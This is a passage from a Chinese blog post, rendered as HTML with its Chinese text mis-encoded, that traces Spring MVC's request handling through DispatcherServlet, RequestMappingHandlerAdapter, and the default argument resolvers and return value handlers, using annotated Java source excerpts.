class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <br>        ...<br><br>        <span class="hljs-comment">// Determine handler for the current request.</span><br>        mappedHandler = getHandler(processedRequest);<br>        <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-literal">null</span>) &#123;<br>            noHandlerFound(processedRequest, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Determine handler adapter for the current request.</span><br>        <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br><br>        ...<br><span class="hljs-comment">//æœ¬èŠ‚é‡ç‚¹</span><br>        <span class="hljs-comment">// Actually invoke the handler.</span><br>        mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br></code></pre></td></tr></table></figure><p><code>HandlerAdapter</code>æ¥å£å®ç°ç±»<code>RequestMappingHandlerAdapter</code>ï¼ˆä¸»è¦ç”¨æ¥å¤„ç†<code>@RequestMapping</code>ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//AbstractHandlerMethodAdapterç±»çš„æ–¹æ³•ï¼ŒRequestMappingHandlerAdapterç»§æ‰¿AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> ModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span><br>        <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">return</span> handleInternal(request, response, (HandlerMethod) handler);<br>    &#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ModelAndView mav;<br>        <span class="hljs-comment">//handleInternalçš„æ ¸å¿ƒ</span><br>        mav = invokeHandlerMethod(request, response, handlerMethod);<span class="hljs-comment">//è§£é‡Šçœ‹ä¸‹èŠ‚</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">return</span> mav;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å‚æ•°è§£æå™¨"><a href="#å‚æ•°è§£æå™¨" class="headerlink" title="å‚æ•°è§£æå™¨"></a>å‚æ•°è§£æå™¨</h3><p>ç¡®å®šå°†è¦æ‰§è¡Œçš„ç›®æ ‡æ–¹æ³•çš„æ¯ä¸€ä¸ªå‚æ•°çš„å€¼æ˜¯ä»€ä¹ˆ;</p><p>SpringMVCç›®æ ‡æ–¹æ³•èƒ½å†™å¤šå°‘ç§å‚æ•°ç±»å‹ã€‚å–å†³äº<strong>å‚æ•°è§£æå™¨argumentResolvers</strong>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">                                           HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">WebDataBinderFactory</span> <span class="hljs-variable">binderFactory</span> <span class="hljs-operator">=</span> getDataBinderFactory(handlerMethod);<br>        <span class="hljs-type">ModelFactory</span> <span class="hljs-variable">modelFactory</span> <span class="hljs-operator">=</span> getModelFactory(handlerMethod, binderFactory);<br><br>        <span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//&lt;-----å…³æ³¨ç‚¹</span><br>            invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>        &#125;<br>        <br>        ...<br></code></pre></td></tr></table></figure><p><code>this.argumentResolvers</code>åœ¨<code>afterPropertiesSet()</code>æ–¹æ³•å†…åˆå§‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br>    <span class="hljs-meta">@Nullable</span><br>    <span class="hljs-keyword">private</span> HandlerMethodArgumentResolverComposite argumentResolvers;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterPropertiesSet</span><span class="hljs-params">()</span> &#123;<br>        ...<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//åˆå§‹åŒ–argumentResolvers</span><br>        List&lt;HandlerMethodArgumentResolver&gt; resolvers = getDefaultArgumentResolvers();<br>            <span class="hljs-built_in">this</span>.argumentResolvers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerMethodArgumentResolverComposite</span>().addResolvers(resolvers);<br>        &#125;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">//åˆå§‹åŒ–äº†ä¸€å †çš„å®ç°HandlerMethodArgumentResolveræ¥å£çš„</span><br><span class="hljs-keyword">private</span> List&lt;HandlerMethodArgumentResolver&gt; <span class="hljs-title function_">getDefaultArgumentResolvers</span><span class="hljs-params">()</span> &#123;<br>List&lt;HandlerMethodArgumentResolver&gt; resolvers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">30</span>);<br><br><span class="hljs-comment">// Annotation-based argument resolution</span><br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestParamMethodArgumentResolver</span>(getBeanFactory(), <span class="hljs-literal">false</span>));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestParamMapMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PathVariableMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PathVariableMapMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MatrixVariableMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MatrixVariableMapMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span>(<span class="hljs-literal">false</span>));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestResponseBodyMethodProcessor</span>(getMessageConverters(), <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestPartMethodArgumentResolver</span>(getMessageConverters(), <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHeaderMethodArgumentResolver</span>(getBeanFactory()));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestHeaderMapMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletCookieValueMethodArgumentResolver</span>(getBeanFactory()));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ExpressionValueMethodArgumentResolver</span>(getBeanFactory()));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionAttributeMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestAttributeMethodArgumentResolver</span>());<br><br><span class="hljs-comment">// Type-based argument resolution</span><br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletResponseMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntityMethodProcessor</span>(getMessageConverters(), <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RedirectAttributesMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelMethodProcessor</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MapMethodProcessor</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorsMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionStatusMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UriComponentsBuilderMethodArgumentResolver</span>());<br><span class="hljs-keyword">if</span> (KotlinDetector.isKotlinPresent()) &#123;<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ContinuationHandlerMethodArgumentResolver</span>());<br>&#125;<br><br><span class="hljs-comment">// Custom arguments</span><br><span class="hljs-keyword">if</span> (getCustomArgumentResolvers() != <span class="hljs-literal">null</span>) &#123;<br>resolvers.addAll(getCustomArgumentResolvers());<br>&#125;<br><br><span class="hljs-comment">// Catch-all</span><br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrincipalMethodArgumentResolver</span>());<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestParamMethodArgumentResolver</span>(getBeanFactory(), <span class="hljs-literal">true</span>));<br>resolvers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span>(<span class="hljs-literal">true</span>));<br><br><span class="hljs-keyword">return</span> resolvers;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>HandlerMethodArgumentResolverComposite</code>ç±»å¦‚ä¸‹ï¼šï¼ˆä¼—å¤š<strong>å‚æ•°è§£æå™¨argumentResolvers</strong>çš„åŒ…è£…ç±»ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerMethodArgumentResolverComposite</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;HandlerMethodArgumentResolver&gt; argumentResolvers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <br>    ...<br>    <br><span class="hljs-keyword">public</span> HandlerMethodArgumentResolverComposite <span class="hljs-title function_">addResolvers</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> HandlerMethodArgumentResolver... resolvers)</span> &#123;<br><br><span class="hljs-keyword">if</span> (resolvers != <span class="hljs-literal">null</span>) &#123;<br>Collections.addAll(<span class="hljs-built_in">this</span>.argumentResolvers, resolvers);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>&#125;<br>    <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹çœ‹<code>HandlerMethodArgumentResolver</code>çš„æºç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> &#123;<br><br>    <span class="hljs-comment">//å½“å‰è§£æå™¨æ˜¯å¦æ”¯æŒè§£æè¿™ç§å‚æ•°</span><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span>;<br><br><span class="hljs-meta">@Nullable</span><span class="hljs-comment">//å¦‚æœæ”¯æŒï¼Œå°±è°ƒç”¨ resolveArgument</span><br>Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="è¿”å›å€¼å¤„ç†å™¨"><a href="#è¿”å›å€¼å¤„ç†å™¨" class="headerlink" title="è¿”å›å€¼å¤„ç†å™¨"></a>è¿”å›å€¼å¤„ç†å™¨</h3><p><strong>ValueHandler</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">                                           HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">WebDataBinderFactory</span> <span class="hljs-variable">binderFactory</span> <span class="hljs-operator">=</span> getDataBinderFactory(handlerMethod);<br>        <span class="hljs-type">ModelFactory</span> <span class="hljs-variable">modelFactory</span> <span class="hljs-operator">=</span> getModelFactory(handlerMethod, binderFactory);<br><br>        <span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<br>            invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//&lt;---å…³æ³¨ç‚¹</span><br>            invocableMethod.setHandlerMethodReturnValueHandlers(<span class="hljs-built_in">this</span>.returnValueHandlers);<br>        &#125;<br>     ...<br><br></code></pre></td></tr></table></figure><p><code>this.returnValueHandlers</code>åœ¨<code>afterPropertiesSet()</code>æ–¹æ³•å†…åˆå§‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> HandlerMethodReturnValueHandlerComposite returnValueHandlers;<br>    <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterPropertiesSet</span><span class="hljs-params">()</span> &#123;<br><br>        ...<br>        <br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers == <span class="hljs-literal">null</span>) &#123;<br>List&lt;HandlerMethodReturnValueHandler&gt; handlers = getDefaultReturnValueHandlers();<br><span class="hljs-built_in">this</span>.returnValueHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerMethodReturnValueHandlerComposite</span>().addHandlers(handlers);<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-comment">//åˆå§‹åŒ–äº†ä¸€å †çš„å®ç°HandlerMethodReturnValueHandleræ¥å£çš„</span><br>    <span class="hljs-keyword">private</span> List&lt;HandlerMethodReturnValueHandler&gt; <span class="hljs-title function_">getDefaultReturnValueHandlers</span><span class="hljs-params">()</span> &#123;<br>List&lt;HandlerMethodReturnValueHandler&gt; handlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(<span class="hljs-number">20</span>);<br><br><span class="hljs-comment">// Single-purpose return value types</span><br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndViewMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelMethodProcessor</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseBodyEmitterReturnValueHandler</span>(getMessageConverters(),<br><span class="hljs-built_in">this</span>.reactiveAdapterRegistry, <span class="hljs-built_in">this</span>.taskExecutor, <span class="hljs-built_in">this</span>.contentNegotiationManager));<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamingResponseBodyReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntityMethodProcessor</span>(getMessageConverters(),<br><span class="hljs-built_in">this</span>.contentNegotiationManager, <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeadersReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CallableMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DeferredResultMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AsyncTaskMethodReturnValueHandler</span>(<span class="hljs-built_in">this</span>.beanFactory));<br><br><span class="hljs-comment">// Annotation-based return value types</span><br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span>(<span class="hljs-literal">false</span>));<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestResponseBodyMethodProcessor</span>(getMessageConverters(),<br><span class="hljs-built_in">this</span>.contentNegotiationManager, <span class="hljs-built_in">this</span>.requestResponseBodyAdvice));<br><br><span class="hljs-comment">// Multi-purpose return value types</span><br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ViewNameMethodReturnValueHandler</span>());<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MapMethodProcessor</span>());<br><br><span class="hljs-comment">// Custom return value types</span><br><span class="hljs-keyword">if</span> (getCustomReturnValueHandlers() != <span class="hljs-literal">null</span>) &#123;<br>handlers.addAll(getCustomReturnValueHandlers());<br>&#125;<br><br><span class="hljs-comment">// Catch-all</span><br><span class="hljs-keyword">if</span> (!CollectionUtils.isEmpty(getModelAndViewResolvers())) &#123;<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndViewResolverMethodReturnValueHandler</span>(getModelAndViewResolvers()));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>handlers.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletModelAttributeMethodProcessor</span>(<span class="hljs-literal">true</span>));<br>&#125;<br><br><span class="hljs-keyword">return</span> handlers;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>HandlerMethodReturnValueHandlerComposite</code>ç±»å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerMethodReturnValueHandlerComposite</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;HandlerMethodReturnValueHandler&gt; returnValueHandlers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>    ...<br>    <br><span class="hljs-keyword">public</span> HandlerMethodReturnValueHandlerComposite <span class="hljs-title function_">addHandlers</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-meta">@Nullable</span> List&lt;? extends HandlerMethodReturnValueHandler&gt; handlers)</span> &#123;<br><br><span class="hljs-keyword">if</span> (handlers != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.returnValueHandlers.addAll(handlers);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>HandlerMethodReturnValueHandler</code>æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsReturnType</span><span class="hljs-params">(MethodParameter returnType)</span>;<br><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType,</span><br><span class="hljs-params">ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å›é¡¾æ‰§è¡Œç›®æ ‡æ–¹æ³•"><a href="#å›é¡¾æ‰§è¡Œç›®æ ‡æ–¹æ³•" class="headerlink" title="å›é¡¾æ‰§è¡Œç›®æ ‡æ–¹æ³•"></a>å›é¡¾æ‰§è¡Œç›®æ ‡æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    ...<br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>...<br>        mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br></code></pre></td></tr></table></figure><p><code>RequestMappingHandlerAdapter</code>çš„<code>handle()</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 